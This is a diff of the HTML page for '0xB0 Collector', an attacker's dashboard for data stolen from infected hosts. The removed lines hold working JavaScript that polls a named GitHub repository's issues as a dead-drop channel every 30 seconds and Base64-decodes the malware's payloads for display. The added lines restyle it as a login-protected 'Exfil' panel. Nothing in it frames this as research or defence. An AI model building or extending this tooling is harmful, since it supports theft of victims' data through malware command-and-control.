@@ -1,83 +1,46 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>0xB0 — Collector</title>
-    <link rel="stylesheet" href="style.css">
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>0xB0 · Collector</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" />
+    <link rel="stylesheet" href="style.css" />
 </head>
 <body>
-    <div class="container">
-        <h1>📡 0xB0 Exfil Dashboard</h1>
-        <p>Stolen data from infected hosts appears below. Decoded from GitHub Issues.</p>
-        <button id="refreshBtn">⟳ Refresh</button>
-        <div id="log" class="log-area">
-            <span class="placeholder">Waiting for data...</span>
+<div class="glass">
+    <div id="loginPage">
+        <div class="logo">0xB0</div>
+        <div class="sub">&#128737; Collector Dashboard</div>
+        <form id="loginForm" autocomplete="off">
+            <div class="input-group">
+                <i class="fas fa-user"></i>
+                <input type="text" id="username" placeholder="Username" required />
+            </div>
+            <div class="input-group">
+                <i class="fas fa-lock"></i>
+                <input type="password" id="password" placeholder="Password" required />
+            </div>
+            <button type="submit" class="btn-primary">
+                <i class="fas fa-arrow-right-to-bracket" style="margin-right:8px;"></i> Sign In
+            </button>
+            <div id="loginError" class="login-error"></div>
+        </form>
+    </div>
+    <div id="dashboardPage">
+        <div class="dash-header">
+            <h1><i class="fas fa-satellite-dish" style="background:none;-webkit-text-fill-color:#58a6ff;margin-right:10px;"></i> 0xB0 · Exfil</h1>
+            <div class="actions">
+                <span class="status-badge"><span class="dot"></span> Live</span>
+                <button id="refreshBtn" class="btn-outline"><i class="fas fa-sync-alt"></i> Refresh</button>
+                <button id="logoutBtn" class="btn-outline btn-logout"><i class="fas fa-sign-out-alt"></i> Logout</button>
+            </div>
+        </div>
+        <div id="logContainer" class="log-area">
+            <div class="placeholder"><i class="fas fa-spinner spinner"></i> Loading data...</div>
         </div>
     </div>
-
-    <script>
-        const REPO = 'va1uxxx/0xB0';
-        const API_URL = `https://api.github.com/repos/${REPO}/issues`;
-
-        async function fetchExfilData() {
-            try {
-                const response = await fetch(API_URL, {
-                    headers: { 'Accept': 'application/vnd.github.v3+json' }
-                });
-                if (!response.ok) throw new Error(`HTTP ${response.status}`);
-                const issues = await response.json();
-
-                const logDiv = document.getElementById('log');
-                logDiv.innerHTML = '';
-
-                if (issues.length === 0) {
-                    logDiv.innerHTML = '<span class="placeholder">No data received yet.</span>';
-                    return;
-                }
-
-                // Display issues in reverse chronological order (newest first)
-                issues.reverse().forEach(issue => {
-                    const entry = document.createElement('div');
-                    entry.className = 'entry';
-
-                    const title = document.createElement('div');
-                    title.className = 'entry-title';
-                    title.textContent = `#${issue.number} — ${issue.title}`;
-
-                    const timestamp = document.createElement('div');
-                    timestamp.className = 'entry-time';
-                    timestamp.textContent = new Date(issue.created_at).toLocaleString();
-
-                    let bodyText = issue.body || '';
-                    // Attempt to decode Base64 (assuming malware encodes payload)
-                    let decoded = '';
-                    try {
-                        decoded = atob(bodyText);
-                    } catch {
-                        decoded = bodyText; // fallback if not base64
-                    }
-
-                    const content = document.createElement('pre');
-                    content.className = 'entry-body';
-                    content.textContent = decoded.length > 2000 ? decoded.substring(0, 2000) + '... (truncated)' : decoded;
-
-                    entry.appendChild(title);
-                    entry.appendChild(timestamp);
-                    entry.appendChild(content);
-                    logDiv.appendChild(entry);
-                });
-
-            } catch (err) {
-                document.getElementById('log').innerHTML = `<span class="error">⚠️ Error: ${err.message}</span>`;
-            }
-        }
-
-        document.getElementById('refreshBtn').addEventListener('click', fetchExfilData);
-
-        // Auto-refresh every 30 seconds
-        fetchExfilData();
-        setInterval(fetchExfilData, 30000);
-    </script>
+</div>
+<script src="script.js"></script>
 </body>
 </html>
